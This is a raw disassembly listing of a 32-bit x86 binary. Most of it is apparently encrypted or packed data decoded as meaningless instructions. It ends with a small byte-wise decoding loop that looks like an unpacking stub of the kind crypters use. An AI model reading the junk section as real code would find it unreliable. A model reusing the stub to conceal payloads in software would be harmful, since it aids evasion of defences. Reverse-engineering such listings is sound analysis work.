  41639c:	ror    DWORD PTR [edi],1
  41639e:	pop    ecx
  41639f:	mov    ebx,0x975b8350
  4163a4:	cld    
  4163a5:	cld    
  4163a6:	les    ecx,FWORD PTR [ebp+0x71]
  4163a9:	cs dec eax
  4163ab:	(bad)  
  4163ac:	in     al,dx
  4163ad:	dec    eax
  4163ae:	gs loop 0x416388
  4163b1:	sub    DWORD PTR [eax-0x51447c87],edx
  4163b7:	retf   
  4163b8:	mov    ah,BYTE PTR [edx*1+0x714f36e2]
  4163bf:	jmp    0x91db24b9
  4163c4:	fcomp  QWORD PTR [edi+0x66]
  4163c7:	cwde   
  4163c8:	sbb    eax,0x762fdc73
  4163cd:	mov    ebx,0x5717ec5
  4163d2:	add    al,0x1c
  4163d4:	mov    cl,BYTE PTR [ebx]
  4163d6:	mov    dh,0x39
  4163d8:	jmp    0xcdf3efbd
  4163dd:	mov    DWORD PTR [ebp+ebx*4+0x66],0xa2a52b4d
  4163e5:	and    DWORD PTR [edx+0x77af5f7a],edi
  4163eb:	add    al,0xd
  4163ed:	dec    edx
  4163ee:	mov    ah,0x35
  4163f0:	ffreep st(3)
  4163f2:	adc    dh,BYTE PTR [edx+0x2392524b]
  4163f8:	push   ss
  4163f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163fa:	push   eax
  4163fb:	add    eax,0x7abb58fc
  416400:	cmp    ah,al
  416402:	cdq    
  416403:	les    edx,FWORD PTR [esp+ebx*1]
  416406:	sti    
  416407:	push   cs
  416408:	arpl   WORD PTR [eax],cx
  41640a:	sbb    DWORD PTR [edx],esi
  41640c:	ins    BYTE PTR es:[edi],dx
  41640d:	sub    al,0x37
  41640f:	jp     0x416415
  416411:	in     eax,dx
  416412:	xor    esp,DWORD PTR [ebp+0x58]
  416415:	xchg   DWORD PTR [ebx+0x1b9912ee],edx
  41641b:	add    BYTE PTR [ebp-0x5933caaa],ch
  416421:	lahf   
  416422:	mov    WORD PTR [edi-0x12],ds
  416425:	inc    eax
  416426:	test   eax,0x46d5e605
  41642b:	mov    esi,0xbf6238e9
  416430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416431:	xchg   ebp,eax
  416432:	xor    BYTE PTR [edx],bl
  416434:	inc    ecx
  416435:	or     DWORD PTR [edx+eax*4+0x23a4873c],edi
  41643c:	(bad)  cs:[eax+edx*8+0x0]
  416441:	adc    al,0xda
  416443:	inc    edx
  416444:	lds    edi,FWORD PTR [ecx+0x3dfd8365]
  41644a:	adc    esp,0xecf49391
  416450:	loop   0x4164be
  416452:	and    dh,BYTE PTR [ecx-0x51d5559e]
  416458:	and    al,0x93
  41645a:	pop    esp
  41645b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41645c:	fst    st(2)
  41645e:	adc    BYTE PTR [esi],bh
  416460:	adc    bh,BYTE PTR [ebx+0x28587e68]
  416466:	cdq    
  416467:	mov    BYTE PTR [esp+esi*4],al
  41646a:	std    
  41646b:	xor    BYTE PTR [ecx+0x4],cl
  41646e:	std    
  41646f:	mov    eax,0xc487aa5b
  416474:	dec    ebp
  416475:	fnstenv [edx+ebp*1+0x37]
  416479:	dec    ecx
  41647a:	push   edx
  41647b:	mov    edx,0x7b4aa7a7
  416480:	int    0xe4
  416482:	fcmovbe st,st(4)
  416484:	push   eax
  416485:	lds    edi,FWORD PTR [esi-0x4f]
  416488:	cmp    esp,DWORD PTR [esi+0x74]
  41648b:	push   0xffffff8b
  41648d:	push   edi
  41648e:	loopne 0x416504
  416490:	jge    0x416451
  416492:	in     eax,dx
  416493:	mov    ah,0xe0
  416495:	add    bh,bh
  416497:	sub    DWORD PTR [ecx-0x21],edx
  41649a:	fwait
  41649b:	call   0xbea8:0x931807c5
  4164a2:	js     0x416487
  4164a4:	bound  ebp,QWORD PTR [ecx+0x3b]
  4164a7:	jg     0x416506
  4164a9:	mov    ax,ds:0x5978fa99
  4164af:	and    eax,0xe7ff7809
  4164b4:	fimul  DWORD PTR [ecx-0x76]
  4164b7:	add    BYTE PTR [eax-0x17],ch
  4164ba:	jmp    0x4164a4
  4164bc:	imul   ebx,DWORD PTR [eax+0x6f2b7a2e],0xffffffd3
  4164c3:	hlt    
  4164c4:	push   eax
  4164c5:	pop    ebp
  4164c6:	enter  0xeba7,0xe9
  4164ca:	dec    esi
  4164cb:	repz pop esp
  4164cd:	xchg   edi,eax
  4164ce:	jmp    0xcde5:0xde664970
  4164d5:	movq   QWORD PTR [esi+0x61],mm0
  4164d9:	rol    BYTE PTR [edx-0x68],cl
  4164dc:	sbb    ah,ah
  4164de:	ins    DWORD PTR es:[edi],dx
  4164df:	sahf   
  4164e0:	sub    cl,BYTE PTR [ebp+0x66]
  4164e3:	add    DWORD PTR [ecx],ebx
  4164e5:	or     al,0x6c
  4164e7:	sbb    DWORD PTR [ebp-0x6d426b48],0x2d946a92
  4164f1:	inc    edi
  4164f2:	(bad)  
  4164f3:	out    0x2e,eax
  4164f5:	(bad)  
  4164f6:	lahf   
  4164f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f8:	dec    esi
  4164f9:	push   eax
  4164fa:	xchg   esp,eax
  4164fb:	mov    al,BYTE PTR [esi-0xc]
  4164fe:	inc    ebp
  416500:	jl     0x416570
  416502:	arpl   WORD PTR [eax],si
  416504:	pop    es
  416505:	push   ebp
  416506:	imul   eax,edx,0xfffffff9
  416509:	push   edi
  41650a:	cdq    
  41650b:	fld    st(6)
  41650d:	daa    
  41650e:	pop    ss
  41650f:	sahf   
  416510:	jmp    0xbda06c0d
  416515:	cs loop 0x4164df
  416518:	mov    al,ds:0xa5f1176
  41651d:	push   edx
  41651e:	pop    ebp
  41651f:	stos   DWORD PTR es:[edi],eax
  416520:	(bad)  
  416521:	dec    ebp
  416522:	add    dl,ch
  416524:	mov    edi,0x6a0b316d
  416529:	dec    esi
  41652a:	aam    0x2a
  41652c:	aad    0xdf
  41652e:	pop    edi
  41652f:	(bad)  
  416531:	leave  
  416532:	rcr    eax,0x67
  416535:	jnp    0x416528
  416537:	inc    esi
  416538:	fwait
  416539:	stos   DWORD PTR es:[edi],eax
  41653a:	pop    edi
  41653b:	xchg   ebx,eax
  41653c:	leave  
  41653d:	in     al,0x62
  41653f:	xor    BYTE PTR [ebx+0x101915a6],al
  416545:	les    edi,FWORD PTR [ebx-0x2e]
  416548:	sub    BYTE PTR [eax-0x5c],bl
  41654b:	inc    ebp
  41654c:	out    0xb9,eax
  41654e:	mov    ds:0x3ca9cbdf,al
  416553:	inc    esp
  416554:	shl    BYTE PTR [eax+0x344936d4],1
  41655a:	ror    DWORD PTR [ecx+edx*1-0x26],1
  41655e:	call   0xb083bae4
  416563:	fnsave [ebp+0x20]
  416566:	adc    dh,BYTE PTR [eax-0x44]
  416569:	sbb    bl,BYTE PTR [edx-0x10]
  41656c:	cmp    al,0x84
  41656e:	int3   
  41656f:	les    esp,FWORD PTR [ebx+0x464fef94]
  416575:	adc    DWORD PTR [eax],eax
  416577:	cld    
  416578:	cwde   
  416579:	shr    DWORD PTR [eax*8+0x538d0547],1
  416580:	and    BYTE PTR [ebx-0x12],0x11
  416584:	pop    ss
  416585:	das    
  416586:	pusha  
  416587:	push   ebp
  416588:	lods   eax,DWORD PTR ds:[esi]
  416589:	test   BYTE PTR [ebx-0x6ceaf0b0],ch
  41658f:	(bad)  
  416590:	ror    DWORD PTR [eax],cl
  416592:	jp     0x4165e7
  416594:	jg     0x416530
  416596:	push   edi
  416597:	xlat   BYTE PTR ds:[ebx]
  416598:	dec    esp
  416599:	xor    BYTE PTR [edx],cl
  41659b:	sub    ah,BYTE PTR [edi-0x7b]
  41659e:	jmp    0x41654f
  4165a0:	stc    
  4165a1:	cs mov bl,0xbb
  4165a4:	dec    ecx
  4165a5:	std    
  4165a6:	push   0x53
  4165a8:	repz and ebx,DWORD PTR ds:0x55abdbe9
  4165af:	xchg   ebp,eax
  4165b0:	stos   DWORD PTR es:[edi],eax
  4165b1:	fcomp  QWORD PTR [eax-0x3f876af0]
  4165b7:	fisubr DWORD PTR [ebp+0x5fce5428]
  4165bd:	sub    ah,BYTE PTR [ebp-0x76cb5574]
  4165c3:	mov    eax,ds:0xebb1505a
  4165c8:	pop    es
  4165c9:	sahf   
  4165ca:	add    ch,BYTE PTR [esi+0x69]
  4165cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165ce:	push   ebp
  4165cf:	pop    es
  4165d0:	out    0x62,eax
  4165d2:	inc    esp
  4165d3:	and    eax,DWORD PTR [ebx-0x2f]
  4165d6:	mov    bl,0x28
  4165d8:	sar    BYTE PTR [ebp-0x35815d2b],1
  4165de:	call   0xf515f759
  4165e3:	stos   BYTE PTR es:[edi],al
  4165e4:	ja     0x4165df
  4165e6:	test   BYTE PTR [eax-0x437117e6],0x61
  4165ed:	iret   
  4165ee:	cmc    
  4165ef:	xchg   edi,eax
  4165f0:	popf   
  4165f1:	xchg   esi,eax
  4165f2:	stc    
  4165f3:	loopne 0x41661a
  4165f5:	dec    esp
  4165f6:	shl    BYTE PTR [edx+0x3840c463],0x54
  4165fd:	adc    BYTE PTR [ebp+edx*4-0x7649b5c8],bl
  416604:	jno    0x4165b3
  416606:	repnz or bh,BYTE PTR [edx+0x78]
  41660a:	mov    esi,0xd8e45e6c
  41660f:	repz cli 
  416611:	jbe    0x416632
  416613:	jp     0x4165c6
  416615:	int    0x4b
  416617:	aas    
  416618:	xor    dl,ch
  41661a:	addr16 push eax
  41661c:	ja     0x416611
  41661e:	in     eax,dx
  41661f:	xor    esp,0x6b
  416622:	sahf   
  416623:	dec    ebp
  416624:	push   cs
  416625:	xchg   ebp,eax
  416626:	inc    ebx
  416627:	xchg   edx,eax
  416628:	or     ebp,DWORD PTR [ebx+0x3b]
  41662b:	push   ds
  41662c:	jle    0x41660d
  41662e:	out    0xa2,al
  416630:	das    
  416631:	and    eax,0x3167f0bb
  416636:	cmp    al,0x73
  416638:	sbb    ebx,DWORD PTR [edx]
  41663a:	pop    ds
  41663b:	inc    esp
  41663c:	mov    DWORD PTR [eax-0x6f],0x1faa4927
  416643:	push   ecx
  416644:	push   edi
  416645:	pop    esi
  416646:	cmp    ch,bl
  416648:	imul   ebx,DWORD PTR [eax+0x9],0xa0242b81
  41664f:	dec    edx
  416650:	mov    WORD PTR [ecx+0x535cada0],?
  416656:	mov    ebp,0xd63aa2e0
  41665b:	fdiv   st(1),st
  41665d:	rcl    BYTE PTR [eax-0x28],1
  416660:	adc    dl,cl
  416662:	aad    0x43
  416664:	imul   bh
  416666:	adc    BYTE PTR [eax+0x35],0xf3
  41666a:	pop    ds
  41666b:	mov    ds:0x4509927c,eax
  416670:	mov    al,0xd0
  416672:	sbb    eax,0x41bdd7fb
  416677:	xchg   edi,eax
  416678:	pop    edx
  416679:	adc    ch,BYTE PTR [esi+ecx*8]
  41667c:	dec    ebx
  41667d:	sub    al,0xe9
  41667f:	mov    ebp,0x8e343798
  416684:	ss nop
  416686:	stc    
  416687:	stos   BYTE PTR es:[edi],al
  416688:	ss push esi
  41668a:	lahf   
  41668b:	jecxz  0x4166b5
  41668d:	cmp    al,0xf1
  41668f:	outs   dx,BYTE PTR ds:[esi]
  416690:	sar    BYTE PTR [esi+esi*1-0x1f47627c],cl
  416697:	aad    0xb
  416699:	push   cs
  41669a:	scas   eax,DWORD PTR es:[edi]
  41669b:	or     dh,bl
  41669d:	std    
  41669e:	xchg   DWORD PTR [esi],ebp
  4166a0:	imul   ecx,DWORD PTR [ecx+ebx*4+0x68],0x69
  4166a5:	mov    ds:0xac35acdf,eax
  4166aa:	inc    edi
  4166ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ac:	mov    esi,0x9a2b7253
  4166b1:	sub    bl,bl
  4166b3:	mov    ebp,0xd153fca3
  4166b8:	fs sahf 
  4166ba:	push   0x36
  4166bc:	add    edx,0x64e84927
  4166c2:	call   0xad9fa104
  4166c7:	inc    ebx
  4166c8:	lahf   
  4166c9:	pop    edx
  4166ca:	loop   0x41670a
  4166cc:	aas    
  4166cd:	pop    ebx
  4166ce:	test   eax,0x95bac4b7
  4166d3:	loopne 0x416677
  4166d5:	scas   eax,DWORD PTR es:[edi]
  4166d6:	dec    ebp
  4166d7:	fst    st(1)
  4166d9:	(bad)  {k3}
  4166de:	mov    al,ds:0x5b428942
  4166e3:	ja     0x416755
  4166e5:	pushf  
  4166e6:	loopne 0x4166f2
  4166e8:	dec    edi
  4166e9:	test   eax,0x5b56346c
  4166ee:	mov    esi,0xb8cc49f9
  4166f3:	mov    eax,DWORD PTR [eax+0x2d]
  4166f6:	xor    al,0xa5
  4166f8:	xchg   ebp,eax
  4166f9:	in     al,0xab
  4166fb:	dec    esp
  4166fc:	shl    BYTE PTR [ecx+edi*4+0x26e6014c],0x7c
  416704:	xchg   esi,eax
  416705:	call   0x2ffd:0x59c6fd1f
  41670c:	stos   DWORD PTR es:[edi],eax
  41670d:	or     cl,al
  41670f:	adc    esp,esi
  416711:	in     al,0xe4
  416713:	frstor [esi-0x5cb9e20e]
  416719:	push   ss
  41671a:	not    BYTE PTR [edi-0x17865d4c]
  416720:	mov    eax,0xfe985168
  416725:	aam    0xd7
  416727:	or     bh,dh
  416729:	dec    edi
  41672a:	mov    esp,0x33e91a5e
  41672f:	bound  esp,QWORD PTR [edi+0x504bf8bd]
  416735:	jp     0x416790
  416737:	aam    0x5d
  416739:	mov    al,ds:0x9ce4f27d
  41673e:	pop    es
  41673f:	add    BYTE PTR [edx+0xbc89149],ah
  416745:	jecxz  0x4166c9
  416747:	fdivr  st(3),st
  416749:	inc    eax
  41674a:	out    dx,eax
  41674b:	dec    esi
  41674c:	cmp    DWORD PTR [eax-0x37],edx
  41674f:	outs   dx,DWORD PTR ds:[esi]
  416750:	icebp  
  416751:	test   eax,0x6dd19fe2
  416756:	jg     0x416757
  416758:	test   BYTE PTR [ecx],0x4
  41675b:	or     BYTE PTR [ebx+ebx*2-0xb],bh
  41675f:	and    bh,BYTE PTR [ebx]
  416761:	and    ecx,esi
  416763:	shr    DWORD PTR [edx],0x74
  416766:	dec    esi
  416767:	mov    fs,WORD PTR gs:0xd7d42236
  41676e:	push   0x3960b9f8
  416773:	push   edx
  416774:	sar    BYTE PTR [edi],0x44
  416777:	sar    DWORD PTR [esi],cl
  416779:	jp     0x416723
  41677b:	(bad)  
  41677c:	mov    eax,0xa7b95b96
  416781:	rcl    BYTE PTR [edx+0x39],cl
  416784:	ds out 0xda,al
  416787:	jb     0x4167f4
  416789:	or     ecx,DWORD PTR [ebx-0x1bbeee5b]
  41678f:	int3   
  416790:	cmp    esp,DWORD PTR [edi-0x46]
  416793:	ja     0x416782
  416795:	mov    ch,BYTE PTR [ebp-0xe]
  416798:	xchg   BYTE PTR [ebp-0x29],ah
  41679b:	push   ebx
  41679c:	xlat   BYTE PTR ds:[ebx]
  41679d:	adc    ch,BYTE PTR [edi-0x62]
  4167a0:	xchg   edx,eax
  4167a1:	in     eax,0xb1
  4167a3:	dec    edx
  4167a4:	dec    edi
  4167a5:	lea    ebp,[edi+0x2d]
  4167a8:	adc    DWORD PTR [esp+edi*1-0x65],ecx
  4167ac:	sbb    DWORD PTR [eax],ebp
  4167ae:	inc    ebx
  4167af:	mov    cl,0x68
  4167b1:	inc    esi
  4167b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167b3:	dec    ecx
  4167b4:	pusha  
  4167b5:	arpl   si,sp
  4167b7:	or     DWORD PTR [ebx+edx*8+0x12],esp
  4167bb:	jecxz  0x41676a
  4167bd:	comiss xmm5,DWORD PTR [ebx-0x7c]
  4167c1:	stos   DWORD PTR es:[edi],eax
  4167c2:	cmp    ch,BYTE PTR [esi+edi*1-0x5955397d]
  4167c9:	push   0x14f248be
  4167ce:	add    al,0x33
  4167d0:	xor    DWORD PTR [ecx+0x71],esp
  4167d3:	add    BYTE PTR [bx],dh
  4167d6:	mov    ds:0xe9bf860d,al
  4167db:	jmp    0xe6fedfdf
  4167e0:	gs pop eax
  4167e2:	cmp    DWORD PTR [ebx-0x7d48bf5],esp
  4167e8:	rcl    BYTE PTR es:[edi],1
  4167eb:	mov    esp,0x6051752c
  4167f0:	inc    edx
  4167f1:	jp     0x41685e
  4167f3:	and    bl,BYTE PTR [ecx]
  4167f5:	and    al,0x90
  4167f7:	mov    edx,0xc1e13355
  4167fc:	jle    0x4167b5
  4167fe:	cmp    DWORD PTR [ebx],edi
  416800:	push   ss
  416801:	mov    ds:0x7abdc722,eax
  416806:	xor    BYTE PTR [edx+0x61e11c9f],ch
  41680c:	add    al,0x7e
  41680e:	rol    edi,1
  416810:	fidiv  DWORD PTR fs:[ebp-0x5888666f]
  416817:	mov    edx,0x595eed2b
  41681c:	add    DWORD PTR [ebx+0x0],0xf0a62c16
  416823:	stc    
  416824:	imul   esi,DWORD PTR ds:[esi+0x64],0x62
  416829:	pop    ebx
  41682a:	xor    BYTE PTR [esi+0x1e],cl
  41682d:	repz (bad) 
  41682f:	popa   
  416830:	cmc    
  416831:	mov    ds:0x7218f9d7,al
  416836:	es mov ebp,0xee37da48
  41683c:	clc    
  41683d:	dec    ebp
  41683e:	jmp    DWORD PTR [edx]
  416840:	sbb    eax,0xba2f1f22
  416845:	call   0x9d6f8102
  41684a:	(bad)  
  41684b:	jne    0x41688d
  41684d:	(bad)  
  41684e:	pmullw mm3,mm4
  416851:	sbb    DWORD PTR [ebx+0x41],ebx
  416854:	into   
  416855:	xor    eax,0xc540a7c1
  41685a:	xchg   esi,eax
  41685b:	idiv   DWORD PTR [edi+0x2a]
  41685e:	add    BYTE PTR [edx+0x54],ch
  416861:	and    al,0xeb
  416863:	sbb    bl,BYTE PTR [ecx-0x6a]
  416866:	fdivr  DWORD PTR [eax-0x116b121e]
  41686c:	scas   al,BYTE PTR es:[edi]
  41686d:	loopne 0x4168a7
  41686f:	jae    0x416845
  416871:	dec    ecx
  416872:	(bad)
  416875:	imul   ebp,DWORD PTR [edi+0x38eced6b],0xb
  41687c:	cmc    
  41687d:	sub    eax,0x585f1cf0
  416882:	jo     0x416816
  416884:	nop
  416885:	repz or BYTE PTR [edi-0xf],0x76
  41688a:	or     al,0x2f
  41688c:	pop    ebp
  41688d:	mov    dh,0x3
  41688f:	xor    bh,BYTE PTR [edi-0x43]
  416892:	cmp    DWORD PTR ds:0xde54fea2,esi
  416898:	cmc    
  416899:	adc    edx,DWORD PTR [ebx+0x6191ce23]
  41689f:	push   ss
  4168a0:	mov    ebp,0x44d111bd
  4168a5:	xchg   edi,eax
  4168a6:	xor    al,0x60
  4168a8:	adc    BYTE PTR [ecx],cl
  4168aa:	fdiv   DWORD PTR ds:0x5fc36c6a
  4168b0:	loopne 0x4168f7
  4168b2:	jne    0x4168e3
  4168b4:	fsubr  st,st(3)
  4168b6:	into   
  4168b7:	add    eax,0xf4adce83
  4168bc:	fisttp WORD PTR [ecx]
  4168be:	sub    eax,0xbe390c3b
  4168c3:	push   es
  4168c4:	ins    DWORD PTR es:[edi],dx
  4168c5:	mov    ds:0xda97cd93,eax
  4168ca:	out    0x73,al
  4168cc:	sbb    DWORD PTR [edx+0x32993964],ecx
  4168d2:	push   es
  4168d3:	js     0x41688e
  4168d5:	shl    DWORD PTR [ebp+0x2f],cl
  4168d8:	clc    
  4168d9:	mov    bh,0xe7
  4168db:	das    
  4168dc:	push   0x194b5d7d
  4168e1:	aam    0xa
  4168e3:	jno    0x41692c
  4168e5:	out    0x8a,al
  4168e7:	mov    ds:0xd6a6f856,al
  4168ec:	pop    edi
  4168ed:	xor    eax,0xf96f667e
  4168f2:	mov    ecx,0xd93bc4f9
  4168f7:	rcr    DWORD PTR [esi],0x15
  4168fa:	mov    esp,0x678bd3d2
  4168ff:	sub    BYTE PTR [esi],bh
  416901:	jmp    0x41697f
  416903:	in     al,dx
  416904:	mov    edi,0x70c34d91
  416909:	fdiv   QWORD PTR [ebx]
  41690b:	mov    ch,0x6
  41690d:	dec    ebp
  41690e:	jmp    0x4168b8
  416910:	mov    BYTE PTR [eax-0x56b24c27],dh
  416916:	out    0xda,al
  416918:	test   BYTE PTR [eax],bl
  41691a:	dec    ecx
  41691b:	sbb    eax,0x652001cf
  416920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416921:	adc    bl,BYTE PTR [esi+0x10db7e3]
  416927:	fisttp WORD PTR [edi+0xf]
  41692a:	inc    esi
  41692b:	or     eax,0x4b6db4a5
  416930:	sahf   
  416931:	push   ecx
  416932:	cwde   
  416933:	dec    ecx
  416934:	(bad)
  416938:	jmp    0x8b45:0x6e6e31ae
  41693f:	jne    0x41693d
  416941:	call   esi
  416943:	mov    DWORD PTR [ebp-0x38],eax
  416946:	cmp    DWORD PTR [ebp-0x38],0x57
  41694a:	jne    0x416958
  41694c:	mov    edx,DWORD PTR [ebp-0x20]
  41694f:	push   edx
  416950:	call   0x401000
  416955:	add    esp,0x4
  416958:	xor    eax,eax
  41695a:	pop    esi
  41695b:	mov    esp,ebp
  41695d:	pop    ebp
  41695e:	ret    
  41695f:	push   ebp
  416960:	mov    ebp,esp
  416962:	sub    esp,0x124
  416968:	xor    eax,eax
  41696a:	mov    esp,ebp
  41696c:	pop    ebp
  41696d:	ret    
  41696e:	push   ebp
  41696f:	mov    ebp,esp
  416971:	sub    esp,0x2c
  416974:	push   ebx
  416975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41697c:	mov    DWORD PTR [ebp-0xc],0x0
  416983:	mov    DWORD PTR [ebp-0x20],0x1
  41698a:	mov    DWORD PTR [ebp-0x10],0x0
  416991:	mov    eax,DWORD PTR [ebp+0xc]
  416994:	mov    DWORD PTR [ebp-0x1c],eax
  416997:	mov    DWORD PTR [ebp-0x18],0x0
  41699e:	mov    DWORD PTR [ebp-0x8],0x0
  4169a5:	mov    DWORD PTR [ebp-0x24],0x0
  4169ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4169af:	sub    ecx,0x1
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	mov    edx,DWORD PTR [ebp+0x8]
  4169b8:	mov    DWORD PTR [ebp-0x10],edx
  4169bb:	mov    DWORD PTR [ebp-0x28],0x1
  4169c2:	mov    eax,DWORD PTR [ebp-0x4]
  4169c5:	add    eax,0x2
  4169c8:	mov    DWORD PTR [ebp-0x4],eax
  4169cb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4169ce:	add    ecx,DWORD PTR [ebp-0x4]
  4169d1:	mov    dl,BYTE PTR [ecx+0x1]
  4169d4:	mov    BYTE PTR [ebp-0x11],dl
  4169d7:	mov    eax,DWORD PTR [ebp-0x4]
  4169da:	add    eax,0x1
  4169dd:	mov    DWORD PTR [ebp-0x4],eax
  4169e0:	mov    cl,BYTE PTR [ebp-0x11]
  4169e3:	mov    BYTE PTR [ebp-0x29],cl
  4169e6:	push   edx
  4169e7:	pop    ebx
  4169e8:	mov    ecx,ebx
  4169ea:	mov    edx,DWORD PTR [ebp-0x10]
  4169ed:	add    edx,DWORD PTR [ebp-0x4]
  4169f0:	mov    al,BYTE PTR [ebp-0x29]
  4169f3:	mov    BYTE PTR [edx],al
  4169f5:	mov    ebx,esi
  4169f7:	mov    ecx,DWORD PTR [ebp+0x14]
  4169fa:	add    ecx,DWORD PTR [ebp-0x8]
  4169fd:	movzx  edx,BYTE PTR [ecx]
  416a00:	mov    DWORD PTR [ebp-0xc],edx
  416a03:	mov    eax,DWORD PTR [ebp-0x8]
  416a06:	mov    ecx,DWORD PTR [ebp-0x28]
  416a09:	add    eax,ecx
  416a0b:	mov    DWORD PTR [ebp-0x8],eax
  416a0e:	mov    eax,DWORD PTR [ebp-0x8]
  416a11:	shr    eax,0x3
  416a14:	mov    ecx,0x1
  416a19:	sub    ecx,eax
  416a1b:	mov    DWORD PTR [ebp-0x20],ecx
  416a1e:	shr    eax,cl
  416a20:	mov    edx,DWORD PTR [ebp-0x8]
  416a23:	imul   edx,DWORD PTR [ebp-0x20]
  416a27:	mov    DWORD PTR [ebp-0x8],edx
  416a2a:	shl    ebx,0x3
  416a2d:	mov    eax,DWORD PTR [ebp-0x10]
  416a30:	add    eax,DWORD PTR [ebp-0x4]
  416a33:	movzx  ecx,BYTE PTR [eax]
  416a36:	add    ecx,DWORD PTR [ebp-0xc]
  416a39:	mov    edx,DWORD PTR [ebp-0x10]
  416a3c:	add    edx,DWORD PTR [ebp-0x4]
  416a3f:	mov    BYTE PTR [edx],cl
  416a41:	mov    eax,DWORD PTR [ebp-0x4]
  416a44:	sub    eax,0x2
  416a47:	mov    DWORD PTR [ebp-0x4],eax
  416a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  416a4d:	cmp    ecx,DWORD PTR [ebp+0x10]
  416a50:	jl     0x4169c2
  416a56:	pop    ebx
  416a57:	mov    esp,ebp
  416a59:	pop    ebp
  416a5a:	ret    
  416a5b:	int3   
  416a5c:	jmp    DWORD PTR ds:0x417008
